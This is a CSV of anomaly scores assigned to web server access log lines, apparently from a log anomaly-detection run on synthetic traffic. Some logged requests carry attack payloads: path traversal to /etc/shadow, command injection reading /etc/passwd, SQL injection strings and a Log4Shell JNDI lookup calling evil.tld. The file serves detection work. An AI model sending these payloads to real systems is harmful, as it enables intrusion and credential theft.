score_content,score_session,score_fused,score_fused_norm,line
103.94060516357422,,103.94060516357422,103.94060516357422,181.179.42.39 - - [10/Jan/2025:12:00:42 +0000] "TRACE /contact HTTP/1.1" 200 4877 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0024616718292236,,2.0024616718292236,2.0024616718292236,188.132.109.160 - - [10/Jan/2025:12:00:42 +0000] "GET /profile HTTP/1.1" 200 2182 "https://news.ycombinator.com/" "dirb/2.22"
75.5138168334961,,75.5138168334961,75.5138168334961,242.180.136.170 - - [10/Jan/2025:12:00:42 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 304 7216 "https://www.google.com/" "sqlmap/1.7.2#stable"
47.080020904541016,,47.080020904541016,47.080020904541016,235.12.66.108 - - [10/Jan/2025:12:00:42 +0000] "HEAD /dashboard HTTP/1.1" 200 9650 "https://example.com/" "sqlmap/1.7.2#stable"
126.38789367675781,,126.38789367675781,126.38789367675781,71.9.225.83 - - [10/Jan/2025:12:00:42 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 17682 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
97.83590698242188,,97.83590698242188,97.83590698242188,44.154.97.250 - - [10/Jan/2025:12:00:45 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 302 11379 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
52.5508918762207,,52.5508918762207,52.5508918762207,204.135.126.174 - - [10/Jan/2025:12:00:45 +0000] "DELETE /search?q=ssd HTTP/1.1" 301 6926 "https://twitter.com/" "dirb/2.22"
27.07659149169922,,27.07659149169922,27.07659149169922,46.20.67.85 - - [10/Jan/2025:12:00:48 +0000] "POST /search?q=router HTTP/1.1" 200 12838 "https://example.com/" "curl/7.85.0"
2.085500717163086,,2.085500717163086,2.085500717163086,34.90.174.106 - - [10/Jan/2025:12:00:50 +0000] "GET /login HTTP/1.1" 200 6204 "https://twitter.com/" "curl/7.85.0"
49.608497619628906,,49.608497619628906,49.608497619628906,172.112.142.5 - - [10/Jan/2025:12:00:50 +0000] "DELETE /search?q=monitor HTTP/1.1" 204 11488 "-" "python-requests/2.31.0"
52.46563720703125,,52.46563720703125,52.46563720703125,16.240.147.61 - - [10/Jan/2025:12:00:53 +0000] "DELETE /search?q=monitor HTTP/1.1" 302 3473 "https://www.google.com/" "curl/7.85.0"
30139.962890625,,30139.962890625,30139.962890625,150.245.134.158 - - [10/Jan/2025:12:00:53 +0000] "GET /index.html HTTP/1.1" 401 93 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.675636291503906,,4.675636291503906,4.675636291503906,241.88.235.79 - - [10/Jan/2025:12:00:55 +0000] "POST /dashboard HTTP/1.1" 200 10064 "https://example.com/" "dirb/2.22"
126.32173156738281,,126.32173156738281,126.32173156738281,112.109.103.59 - - [10/Jan/2025:12:00:56 +0000] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 3403 "-" "curl/7.85.0"
35.542606353759766,,35.542606353759766,35.542606353759766,193.153.151.88 - - [10/Jan/2025:12:00:57 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 200 8857 "https://news.ycombinator.com/" "nikto/2.5.0"
70.8582763671875,,70.8582763671875,70.8582763671875,8.164.74.146 - - [10/Jan/2025:12:00:58 +0000] "OPTIONS /cgi-bin/test.cgi HTTP/1.1" 200 14484 "https://twitter.com/" "dirb/2.22"
4.891930103302002,,4.891930103302002,4.891930103302002,130.159.68.149 - - [10/Jan/2025:12:01:01 +0000] "GET /profile HTTP/1.1" 302 7735 "https://example.com/" "nikto/2.5.0"
30163.9140625,,30163.9140625,30163.9140625,81.173.119.104 - - [10/Jan/2025:12:01:04 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 403 1493 "https://twitter.com/" "python-requests/2.31.0"
97.79963684082031,,97.79963684082031,97.79963684082031,123.219.188.244 - - [10/Jan/2025:12:01:04 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 301 6256 "https://example.com/" "python-requests/2.31.0"
126.3754653930664,,126.3754653930664,126.3754653930664,139.120.152.142 - - [10/Jan/2025:12:01:05 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 13104 "https://news.ycombinator.com/" "dirb/2.22"
11053.78515625,,11053.78515625,11053.78515625,100.88.28.217 - - [10/Jan/2025:12:01:05 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 502 1262 "https://www.google.com/" "python-requests/2.31.0"
0.2315935641527176,,0.2315935641527176,0.2315935641527176,217.85.28.128 - - [10/Jan/2025:12:01:06 +0000] "GET /assets/app.js HTTP/1.1" 200 7290 "-" "python-requests/2.31.0"
4.728315353393555,,4.728315353393555,4.728315353393555,50.130.202.112 - - [10/Jan/2025:12:01:06 +0000] "POST /contact HTTP/1.1" 204 7662 "-" "dirb/2.22"
0.23853498697280884,,0.23853498697280884,0.23853498697280884,187.3.92.144 - - [10/Jan/2025:12:01:06 +0000] "GET /assets/app.css HTTP/1.1" 201 18763 "https://twitter.com/" "nikto/2.5.0"
48.197322845458984,,48.197322845458984,48.197322845458984,87.138.138.244 - - [10/Jan/2025:12:01:06 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 304 4457 "https://example.com/" "nikto/2.5.0"
27.2879638671875,,27.2879638671875,27.2879638671875,9.243.52.194 - - [10/Jan/2025:12:01:09 +0000] "DELETE /contact HTTP/1.1" 200 1444 "https://example.com/" "python-requests/2.31.0"
0.20194333791732788,,0.20194333791732788,0.20194333791732788,25.136.36.93 - - [10/Jan/2025:12:01:09 +0000] "GET /assets/app.css HTTP/1.1" 200 5729 "-" "python-requests/2.31.0"
49.6015510559082,,49.6015510559082,49.6015510559082,111.178.229.50 - - [10/Jan/2025:12:01:10 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 903 "https://news.ycombinator.com/" "python-requests/2.31.0"
72.79678344726562,,72.79678344726562,72.79678344726562,223.254.135.66 - - [10/Jan/2025:12:01:12 +0000] "OPTIONS /login HTTP/1.1" 200 18396 "https://example.com/" "curl/7.85.0"
129.10894775390625,,129.10894775390625,129.10894775390625,34.111.191.72 - - [10/Jan/2025:12:01:14 +0000] "TRACE /search?q=headphones HTTP/1.1" 302 15098 "https://twitter.com/" "nikto/2.5.0"
103.98274230957031,,103.98274230957031,103.98274230957031,157.81.125.193 - - [10/Jan/2025:12:01:15 +0000] "TRACE /profile HTTP/1.1" 200 19274 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30243.6328125,,30243.6328125,30243.6328125,220.205.69.97 - - [10/Jan/2025:12:01:16 +0000] "TRACE /logout HTTP/1.1" 403 346 "https://example.com/" "curl/7.85.0"
13.110060691833496,,13.110060691833496,13.110060691833496,116.224.60.221 - - [10/Jan/2025:12:01:17 +0000] "PUT /dashboard HTTP/1.1" 200 12291 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
69.51708221435547,,69.51708221435547,69.51708221435547,37.174.77.174 - - [10/Jan/2025:12:01:20 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 6819 "https://news.ycombinator.com/" "nikto/2.5.0"
72.72148132324219,,72.72148132324219,72.72148132324219,133.82.198.31 - - [10/Jan/2025:12:01:20 +0000] "OPTIONS /logout HTTP/1.1" 200 5747 "-" "sqlmap/1.7.2#stable"
95.14867401123047,,95.14867401123047,95.14867401123047,49.184.236.219 - - [10/Jan/2025:12:01:21 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 16491 "https://example.com/" "python-requests/2.31.0"
3.038400173187256,,3.038400173187256,3.038400173187256,137.90.253.223 - - [10/Jan/2025:12:01:24 +0000] "POST /.git/config HTTP/1.1" 200 18954 "https://twitter.com/" "dirb/2.22"
103.8900146484375,,103.8900146484375,103.8900146484375,29.225.147.74 - - [10/Jan/2025:12:01:27 +0000] "TRACE /dashboard HTTP/1.1" 200 10110 "-" "dirb/2.22"
72.36640167236328,,72.36640167236328,72.36640167236328,191.33.122.78 - - [10/Jan/2025:12:01:30 +0000] "HEAD /search?q=phone HTTP/1.1" 302 7368 "https://twitter.com/" "dirb/2.22"
30.122901916503906,,30.122901916503906,30.122901916503906,89.121.163.18 - - [10/Jan/2025:12:01:30 +0000] "DELETE /dashboard HTTP/1.1" 302 12656 "https://example.com/" "nikto/2.5.0"
69.47036743164062,,69.47036743164062,69.47036743164062,107.227.234.28 - - [10/Jan/2025:12:01:30 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 14954 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
129.10845947265625,,129.10845947265625,129.10845947265625,221.84.63.83 - - [10/Jan/2025:12:01:30 +0000] "TRACE /search?q=headphones HTTP/1.1" 302 14920 "https://twitter.com/" "python-requests/2.31.0"
38.40750503540039,,38.40750503540039,38.40750503540039,1.34.25.91 - - [10/Jan/2025:12:01:30 +0000] "PUT /api/product?id=123 HTTP/1.1" 302 1142 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30152.716796875,,30152.716796875,30152.716796875,37.142.46.249 - - [10/Jan/2025:12:01:32 +0000] "PUT /login HTTP/1.1" 400 1115 "-" "python-requests/2.31.0"
69.52869415283203,,69.52869415283203,69.52869415283203,237.128.112.63 - - [10/Jan/2025:12:01:33 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 2944 "https://twitter.com/" "sqlmap/1.7.2#stable"
35.52459716796875,,35.52459716796875,35.52459716796875,186.226.47.60 - - [10/Jan/2025:12:01:36 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 2563 "https://twitter.com/" "sqlmap/1.7.2#stable"
30234.701171875,,30234.701171875,30234.701171875,254.41.82.225 - - [10/Jan/2025:12:01:36 +0000] "OPTIONS /search?q=phone HTTP/1.1" 403 267 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30243.42578125,,30243.42578125,30243.42578125,173.99.29.63 - - [10/Jan/2025:12:01:37 +0000] "TRACE /api/products HTTP/1.1" 401 1388 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
7.671211242675781,,7.671211242675781,7.671211242675781,84.208.23.221 - - [10/Jan/2025:12:01:39 +0000] "POST /logout HTTP/1.1" 302 15714 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11102.265625,,11102.265625,11102.265625,131.197.29.254 - - [10/Jan/2025:12:01:42 +0000] "OPTIONS /about HTTP/1.1" 500 52 "https://www.google.com/" "sqlmap/1.7.2#stable"
95.10973358154297,,95.10973358154297,95.10973358154297,56.212.81.60 - - [10/Jan/2025:12:01:45 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 189 "https://twitter.com/" "sqlmap/1.7.2#stable"
126.3269271850586,,126.3269271850586,126.3269271850586,77.218.213.222 - - [10/Jan/2025:12:01:45 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 4976 "https://news.ycombinator.com/" "curl/7.85.0"
30141.564453125,,30141.564453125,30141.564453125,221.201.234.229 - - [10/Jan/2025:12:01:47 +0000] "GET /profile HTTP/1.1" 400 183 "https://www.google.com/" "curl/7.85.0"
0.3089500665664673,,0.3089500665664673,0.3089500665664673,182.67.210.141 - - [10/Jan/2025:12:01:47 +0000] "GET /index.html HTTP/1.1" 200 5461 "https://www.google.com/" "curl/7.85.0"
13.12015151977539,,13.12015151977539,13.12015151977539,81.124.182.242 - - [10/Jan/2025:12:01:49 +0000] "PUT /api/products HTTP/1.1" 200 8966 "-" "nikto/2.5.0"
72.63021087646484,,72.63021087646484,72.63021087646484,168.20.19.73 - - [10/Jan/2025:12:01:52 +0000] "OPTIONS /dashboard HTTP/1.1" 200 9550 "https://example.com/" "nikto/2.5.0"
29.97123908996582,,29.97123908996582,29.97123908996582,52.171.215.10 - - [10/Jan/2025:12:01:54 +0000] "POST /search?q=laptop HTTP/1.1" 304 6329 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.21206283569336,,47.21206283569336,47.21206283569336,114.142.235.126 - - [10/Jan/2025:12:01:56 +0000] "HEAD /login HTTP/1.1" 200 6725 "-" "curl/7.85.0"
25.839128494262695,,25.839128494262695,25.839128494262695,104.19.206.95 - - [10/Jan/2025:12:01:57 +0000] "DELETE /.env HTTP/1.1" 200 17568 "-" "python-requests/2.31.0"
24.39061164855957,,24.39061164855957,24.39061164855957,168.110.83.167 - - [10/Jan/2025:12:02:00 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7518 "https://example.com/" "python-requests/2.31.0"
24.368860244750977,,24.368860244750977,24.368860244750977,194.152.37.83 - - [10/Jan/2025:12:02:02 +0000] "GET /search?q=camera HTTP/1.1" 200 16915 "https://twitter.com/" "nikto/2.5.0"
14.294999122619629,,14.294999122619629,14.294999122619629,9.45.189.230 - - [10/Jan/2025:12:02:03 +0000] "PUT /wp-login.php HTTP/1.1" 301 19361 "https://news.ycombinator.com/" "dirb/2.22"
24.3421573638916,,24.3421573638916,24.3421573638916,244.193.111.240 - - [10/Jan/2025:12:02:05 +0000] "GET /search?q=monitor HTTP/1.1" 200 14815 "https://twitter.com/" "dirb/2.22"
0.2444806545972824,,0.2444806545972824,0.2444806545972824,154.233.37.95 - - [10/Jan/2025:12:02:07 +0000] "GET /assets/app.js HTTP/1.1" 200 11289 "https://www.google.com/" "python-requests/2.31.0"
75.48558807373047,,75.48558807373047,75.48558807373047,240.118.111.197 - - [10/Jan/2025:12:02:09 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 301 17902 "https://twitter.com/" "sqlmap/1.7.2#stable"
45.29294204711914,,45.29294204711914,45.29294204711914,55.201.221.93 - - [10/Jan/2025:12:02:10 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 200 9260 "https://www.google.com/" "dirb/2.22"
126.153564453125,,126.153564453125,126.153564453125,182.212.114.163 - - [10/Jan/2025:12:02:13 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 6958 "https://news.ycombinator.com/" "dirb/2.22"
2.326054096221924,,2.326054096221924,2.326054096221924,238.198.70.167 - - [10/Jan/2025:12:02:13 +0000] "GET / HTTP/1.1" 200 14459 "https://www.google.com/" "dirb/2.22"
69.49734497070312,,69.49734497070312,69.49734497070312,169.218.186.149 - - [10/Jan/2025:12:02:15 +0000] "HEAD /search?q=router HTTP/1.1" 200 17171 "https://example.com/" "sqlmap/1.7.2#stable"
11076.8369140625,,11076.8369140625,11076.8369140625,153.167.69.247 - - [10/Jan/2025:12:02:17 +0000] "HEAD /profile HTTP/1.1" 503 53 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.22468827664852142,,0.22468827664852142,0.22468827664852142,38.36.142.18 - - [10/Jan/2025:12:02:19 +0000] "GET /assets/app.css HTTP/1.1" 200 12845 "-" "Wget/1.21.2 (linux-gnu)"
69.48242950439453,,69.48242950439453,69.48242950439453,251.44.246.154 - - [10/Jan/2025:12:02:20 +0000] "HEAD /search?q=router HTTP/1.1" 200 11820 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
50.050724029541016,,50.050724029541016,50.050724029541016,91.246.58.18 - - [10/Jan/2025:12:02:20 +0000] "HEAD /profile HTTP/1.1" 304 1356 "https://example.com/" "curl/7.85.0"
69.42904663085938,,69.42904663085938,69.42904663085938,152.252.137.21 - - [10/Jan/2025:12:02:22 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 3070 "-" "nikto/2.5.0"
11102.1669921875,,11102.1669921875,11102.1669921875,11.132.174.100 - - [10/Jan/2025:12:02:23 +0000] "OPTIONS /contact HTTP/1.1" 502 807 "https://news.ycombinator.com/" "curl/7.85.0"
0.21468037366867065,,0.21468037366867065,0.21468037366867065,61.91.41.56 - - [10/Jan/2025:12:02:23 +0000] "GET /assets/app.js HTTP/1.1" 204 1559 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
38.495174407958984,,38.495174407958984,38.495174407958984,163.106.69.143 - - [10/Jan/2025:12:02:25 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 304 5364 "-" "nikto/2.5.0"
5.789407253265381,,5.789407253265381,5.789407253265381,150.89.83.93 - - [10/Jan/2025:12:02:28 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 304 4775 "https://example.com/" "sqlmap/1.7.2#stable"
27.331165313720703,,27.331165313720703,27.331165313720703,22.110.83.149 - - [10/Jan/2025:12:02:28 +0000] "DELETE /logout HTTP/1.1" 200 6717 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.308631896972656,,27.308631896972656,27.308631896972656,45.104.57.241 - - [10/Jan/2025:12:02:29 +0000] "DELETE /contact HTTP/1.1" 200 10948 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9133517742156982,,1.9133517742156982,1.9133517742156982,195.12.2.254 - - [10/Jan/2025:12:02:32 +0000] "GET /phpmyadmin HTTP/1.1" 200 6372 "https://twitter.com/" "curl/7.85.0"
35.48403549194336,,35.48403549194336,35.48403549194336,38.48.36.5 - - [10/Jan/2025:12:02:34 +0000] "PUT /search?q=router HTTP/1.1" 200 6496 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
52.54924392700195,,52.54924392700195,52.54924392700195,232.63.41.108 - - [10/Jan/2025:12:02:35 +0000] "DELETE /api/backup?file=../../../../etc/shadow HTTP/1.1" 302 7613 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.967527389526367,,26.967527389526367,26.967527389526367,148.197.254.196 - - [10/Jan/2025:12:02:38 +0000] "POST /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 316 "https://example.com/" "dirb/2.22"
29.951208114624023,,29.951208114624023,29.951208114624023,108.134.108.209 - - [10/Jan/2025:12:02:39 +0000] "POST /search?q=laptop HTTP/1.1" 301 19961 "-" "dirb/2.22"
13.1812105178833,,13.1812105178833,13.1812105178833,190.193.225.124 - - [10/Jan/2025:12:02:39 +0000] "PUT /logout HTTP/1.1" 204 4280 "https://example.com/" "dirb/2.22"
2.01324725151062,,2.01324725151062,2.01324725151062,25.201.190.251 - - [10/Jan/2025:12:02:41 +0000] "GET /contact HTTP/1.1" 200 6766 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
49.833839416503906,,49.833839416503906,49.833839416503906,178.191.25.7 - - [10/Jan/2025:12:02:43 +0000] "HEAD /server-status HTTP/1.1" 302 6399 "https://www.google.com/" "dirb/2.22"
1.8514236211776733,,1.8514236211776733,1.8514236211776733,89.67.167.165 - - [10/Jan/2025:12:02:45 +0000] "GET /server-status HTTP/1.1" 200 493 "https://twitter.com/" "nikto/2.5.0"
0.223506361246109,,0.223506361246109,0.223506361246109,11.19.113.41 - - [10/Jan/2025:12:02:47 +0000] "GET /assets/app.css HTTP/1.1" 200 12443 "https://example.com/" "python-requests/2.31.0"
